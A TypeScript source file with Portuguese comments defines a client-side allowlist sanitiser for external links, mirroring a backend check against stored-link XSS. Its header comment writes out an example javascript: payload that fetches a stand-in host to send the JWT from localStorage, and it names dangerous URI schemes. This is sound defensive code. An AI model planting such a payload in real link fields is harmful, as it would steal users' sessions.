/**
 * Saneamento de link de terceiro antes de virar `href`.
 *
 * Espelha `shared.NormalizeSafeLink` do backend (Go). A validação que vale é a
 * de lá — esta existe por dois motivos que o servidor não cobre:
 *
 *  1. Dado legado. Link gravado ANTES de a validação existir no backend
 *     continua no banco exatamente como foi salvo. Sem a checagem no cliente,
 *     corrigir o servidor não protege ninguém enquanto não rodar uma migração.
 *  2. Campo novo. Um link vindo de um endpoint que ainda não valida cai aqui
 *     de qualquer jeito, porque todo link externo do app passa por
 *     `ExternalLink`.
 *
 * O ataque que isso fecha: o app guarda o JWT em localStorage (ver
 * libs/session.ts). Um `javascript:fetch('https://x/?t='+
 * localStorage.token)` gravado por um personal no link de reunião do
 * agendamento entregaria a sessão de cada aluno que clicasse. A CSP com nonce
 * (libs/csp.ts) já bloqueia URI `javascript:` nos navegadores atuais; esta
 * checagem é a segunda camada, e a única num navegador sem CSP nível 3, onde
 * o `'unsafe-inline'` de fallback da política volta a valer.
 */

/**
 * Devolve o link se ele for http(s) — ou caminho relativo do próprio app —, e
 * `null` caso contrário.
 *
 * É allowlist, não blocklist: a lista de esquemas perigosos (`javascript:`,
 * `data:`, `vbscript:`, os que o próximo navegador inventar) muda; a de
 * esquemas seguros para um link clicável não.
 *
 * Quem chama deve renderizar o valor DEVOLVIDO, nunca o original. O navegador
 * ignora espaço e caractere de controle nas pontas ao resolver a URL, então
 * aprovar `" javascript:x"` e renderizar a string crua não protegeria nada.
 */
export function safeExternalHref(raw: string | undefined | null): string | null {
    if (!raw) return null;
    const trimmed = raw.trim();
    if (!trimmed) return null;

    let parsed: URL;
    try {
        // A base só serve para um href relativo ("/ajuda") não virar erro de
        // parse; o que interessa no resultado é o protocolo. Host inexistente
        // de propósito — nada aqui é usado para navegar.
        parsed = new URL(trimmed, 'https://venafit.invalid');
    } catch {
        return null;
    }
    if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
        return null;
    }
    return trimmed;
}
